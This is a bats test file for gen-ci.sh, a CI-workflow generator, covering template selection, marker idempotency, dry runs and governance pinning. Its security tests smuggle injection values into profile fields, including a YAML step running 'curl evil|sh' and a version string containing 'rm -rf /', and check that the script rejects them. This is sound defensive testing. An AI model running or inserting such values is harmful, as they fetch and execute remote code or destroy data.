#!/usr/bin/env bats
# bin/gen-ci.sh — CI workflow generation tests.

setup() {
  REPO_ROOT="$(cd "${BATS_TEST_DIRNAME}/../.." && pwd)"
  GEN="${REPO_ROOT}/bin/gen-ci.sh"
  TMP=$(mktemp -d)
  REPO="$TMP/repo"
  mkdir -p "$REPO"

  PROFILE="$TMP/profile.json"
  STACK="$TMP/stack.json"
}

teardown() { rm -rf "$TMP"; }

make_profile() {
  local lang="${1:-typescript}" pkg="${2:-npm}"
  cat > "$PROFILE" <<JSON
{
  "name": "test-profile",
  "schemaVersion": 1,
  "stack": { "primary_language": "$lang", "framework": null, "package_manager": "$pkg" },
  "branching": { "strategy": "github-flow", "base_branches": ["main"] },
  "hooks": { "pre_commit": ["eslint", "prettier"], "commit_msg": ["conventional-commits"], "pre_push": [] },
  "extras": { "gitignore": true, "editorconfig": false, "claude_md": true, "github_actions_ci": true, "commit_message_template": false },
  "conventions": { "commit_format": "conventional-commits" },
  "ci": { "enabled": true, "node_version": "20" },
  "documentation": { "scaffold_types": [], "storage_strategy": "local", "preferred_mcp": null, "adr_format": "madr", "claude_md_mode": "router", "claude_md_size_budget_kb": 3, "staleness_days": null, "enable_drift_checks": { "broken_internal_links": true, "broken_mcp_links": true, "orphans": true, "staleness": false } }
}
JSON
}

make_stack() {
  local lang="${1:-typescript}"
  cat > "$STACK" <<JSON
{ "primary_language": "$lang", "secondary_languages": [], "is_monorepo": false }
JSON
}

run_gen() {
  bash "$GEN" --profile "$PROFILE" --stack "$STACK" --target "$REPO" "$@"
}

# --- Template selection per stack ---

@test "typescript stack → selects typescript template" {
  make_profile typescript pnpm
  make_stack typescript
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"node-version"* ]]
  [[ "$output" == *"pnpm"* ]]
}

@test "python stack → selects python template" {
  make_profile python pip
  make_stack python
  # Update hooks for python
  jq '.hooks.pre_commit = ["ruff", "ruff-format"]' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  jq '.ci = { "enabled": true, "python_version": "3.12" }' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"python-version"* ]]
  [[ "$output" == *"ruff"* ]]
}

@test "go stack → selects go template" {
  make_profile go go
  make_stack go
  jq '.hooks.pre_commit = ["gofmt", "go-vet", "golangci-lint"]' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  jq '.ci = { "enabled": true, "go_version": "1.22" }' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"go-version"* ]]
  [[ "$output" == *"golangci-lint"* ]]
}

@test "rust stack → selects rust template" {
  make_profile rust cargo
  make_stack rust
  jq '.hooks.pre_commit = ["fmt", "clippy"]' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  jq '.ci = { "enabled": true }' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"cargo fmt"* ]]
  [[ "$output" == *"cargo clippy"* ]]
}

@test "unknown stack → selects generic template" {
  make_profile unknown unknown
  make_stack unknown
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  # Generic template ships failing placeholder steps so an unconfigured
  # workflow doesn't pretend to be green. The exact wording lives in
  # templates/ci/generic.yml.
  [[ "$output" == *"Replace this step with your linter"* ]]
}

# --- Marker idempotency ---

@test "no existing ci.yml → creates file with markers" {
  make_profile typescript npm
  make_stack typescript
  run run_gen
  [ "$status" -eq 0 ]
  [ -f "$REPO/.github/workflows/ci.yml" ]
  grep -Fq '# nyann:ci:start' "$REPO/.github/workflows/ci.yml"
  grep -Fq '# nyann:ci:end' "$REPO/.github/workflows/ci.yml"
}

@test "existing ci.yml with markers → replaces between markers" {
  make_profile typescript npm
  make_stack typescript
  mkdir -p "$REPO/.github/workflows"
  cat > "$REPO/.github/workflows/ci.yml" <<'YML'
# User preamble
# nyann:ci:start
old generated content
# nyann:ci:end
# User postamble
YML
  run run_gen
  [ "$status" -eq 0 ]
  grep -Fq "User preamble" "$REPO/.github/workflows/ci.yml"
  grep -Fq "User postamble" "$REPO/.github/workflows/ci.yml"
  ! grep -Fq "old generated content" "$REPO/.github/workflows/ci.yml"
  grep -Fq "node-version" "$REPO/.github/workflows/ci.yml"
}

@test "existing ci.yml without markers → skipped without --allow-merge-existing" {
  make_profile typescript npm
  make_stack typescript
  mkdir -p "$REPO/.github/workflows"
  echo "# Custom workflow" > "$REPO/.github/workflows/ci.yml"
  run run_gen
  [ "$status" -eq 0 ]
  # User content untouched; no nyann block leaked in silently.
  grep -Fxq "# Custom workflow" "$REPO/.github/workflows/ci.yml"
  ! grep -Fq "# nyann:ci:start" "$REPO/.github/workflows/ci.yml"
}

@test "existing ci.yml without markers → --allow-merge-existing appends block" {
  make_profile typescript npm
  make_stack typescript
  mkdir -p "$REPO/.github/workflows"
  echo "# Custom workflow" > "$REPO/.github/workflows/ci.yml"
  run run_gen --allow-merge-existing
  [ "$status" -eq 0 ]
  # User content preserved AND nyann block appended.
  grep -Fxq "# Custom workflow" "$REPO/.github/workflows/ci.yml"
  grep -Fq "# nyann:ci:start" "$REPO/.github/workflows/ci.yml"
}

# --- Dry-run ---

@test "dry-run prints workflow but does not write file" {
  make_profile typescript npm
  make_stack typescript
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  [ ! -f "$REPO/.github/workflows/ci.yml" ]
  [[ "$output" == *"nyann:ci:start"* ]]
}

# --- Base branches substitution ---

@test "base branches from profile are substituted" {
  make_profile typescript npm
  make_stack typescript
  jq '.branching.base_branches = ["main", "develop"]' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"main, develop"* ]]
}

# --- Error cases ---

@test "missing --stack → dies" {
  make_profile typescript npm
  run bash "$GEN" --profile "$PROFILE" --target "$REPO"
  [ "$status" -ne 0 ]
  [[ "$output" == *"--stack"* ]]
}

@test "missing --profile → dies" {
  make_stack typescript
  run bash "$GEN" --stack "$STACK" --target "$REPO"
  [ "$status" -ne 0 ]
  [[ "$output" == *"--profile"* ]]
}

# --- Security: profile-sourced field injection (BUG C) ---

@test "malicious package_manager → rejected, not interpolated into run: step" {
  # A profile shipped by a (possibly remote) team source carrying a
  # newline-laden package_manager must not splice an attacker-controlled
  # step into the generated YAML. gen-ci.sh validates against the known
  # identifier set and falls back to npm.
  make_profile typescript npm
  make_stack typescript
  # Embed a fake step in the package_manager value.
  jq '.stack.package_manager = "pnpm\n      - name: pwned\n        run: curl evil|sh"' \
    "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  # stdout-only — the rejection warning (stderr) echoes the bad value.
  yml=$(run_gen --dry-run 2>/dev/null)
  # The injected step text must NOT appear anywhere in the generated YAML.
  [[ "$yml" != *"pwned"* ]]
  [[ "$yml" != *"curl evil"* ]]
  # And we fell back to the safe default install command.
  [[ "$yml" == *"npm ci"* ]]
}

@test "malicious node_version → rejected, not interpolated into version field" {
  make_profile typescript npm
  make_stack typescript
  jq '.ci = { "enabled": true, "node_version": "20\n      - name: pwned\n        run: curl evil|sh" }' \
    "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  # Capture stdout only — the validation warning (on stderr) legitimately
  # echoes the rejected value, so assert against the generated YAML alone.
  yml=$(run_gen --dry-run 2>/dev/null)
  [[ "$yml" != *"pwned"* ]]
  [[ "$yml" != *"curl evil"* ]]
  # Reverted to the default node version (rendered as a matrix list).
  [[ "$yml" == *"node-version: [20]"* ]]
}

@test "malicious python_version → rejected, reverts to default" {
  make_profile python pip
  make_stack python
  jq '.hooks.pre_commit = ["ruff"]' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  jq '.ci = { "enabled": true, "python_version": "3.12; rm -rf /\n      - run: pwned" }' \
    "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  yml=$(run_gen --dry-run 2>/dev/null)
  [[ "$yml" != *"pwned"* ]]
  [[ "$yml" != *"rm -rf"* ]]
  # Reverted to the default python version.
  [[ "$yml" == *"python-version: [3.12]"* ]]
}

@test "valid package_manager + version still interpolate normally" {
  make_profile typescript pnpm
  make_stack typescript
  jq '.ci = { "enabled": true, "node_version": "18.17" }' "$PROFILE" > "${PROFILE}.tmp" && mv "${PROFILE}.tmp" "$PROFILE"
  run run_gen --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"pnpm install --frozen-lockfile"* ]]
  [[ "$output" == *"18.17"* ]]
}

# --- Governance template renders correctly (BUG A + BUG B) ---

@test "governance workflow uses correct owner and current pinned version" {
  make_profile typescript npm
  make_stack typescript
  run run_gen --governance --dry-run
  [ "$status" -eq 0 ]
  # BUG A: correct GitHub owner (thettwe, not thettweaung).
  [[ "$output" == *"https://github.com/thettwe/nyann.git"* ]]
  [[ "$output" != *"thettweaung"* ]]
  # BUG B: pinned default bumped off the stale 1.3.0.
  [[ "$output" != *"v\${NYANN_VERSION:-1.3.0}"* ]]
  # Default tracks the shipping version in plugin.json.
  local plugin_ver
  plugin_ver=$(jq -r '.version' "${REPO_ROOT}/.claude-plugin/plugin.json")
  [[ "$output" == *"v\${NYANN_VERSION:-${plugin_ver}}"* ]]
}

@test "governance template uses the version placeholder, not a hardcoded literal" {
  # The pin must be stamped by gen-ci.sh from plugin.json so it can't drift.
  # A reintroduced hardcoded default (e.g. v${NYANN_VERSION:-1.2.3}) regresses
  # the staleness bug — guard against it at the template level.
  run grep -F '__NYANN_VERSION__' "${REPO_ROOT}/templates/ci/governance-check.yml"
  [ "$status" -eq 0 ]
  run grep -Eq 'NYANN_VERSION:-[0-9]+\.[0-9]+\.[0-9]+' "${REPO_ROOT}/templates/ci/governance-check.yml"
  [ "$status" -ne 0 ]
}
